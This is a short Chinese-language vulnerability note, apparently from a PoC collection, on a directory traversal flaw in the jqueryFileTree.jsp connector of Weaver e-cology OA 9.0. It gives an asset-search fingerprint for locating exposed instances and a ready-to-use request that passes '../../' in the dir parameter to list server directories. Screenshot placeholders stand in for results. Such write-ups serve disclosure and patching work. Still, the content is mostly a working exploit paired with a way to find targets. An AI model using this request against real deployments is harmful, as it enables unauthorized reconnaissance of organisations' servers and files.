# 泛微OA E-Cology jqueryFileTree.jsp 目录遍历漏洞

## 漏洞描述

泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等，其中 jqueryFileTree.jsp 文件中 dir 参数存在目录遍历漏洞，攻击者通过漏洞可以获取服务器文件目录信息

## 漏洞影响

```
泛微e-cology 9.0
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

登录页面

![](images/202209131045944.png)

验证POC

```
/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../
```

![](images/202209131046623.png)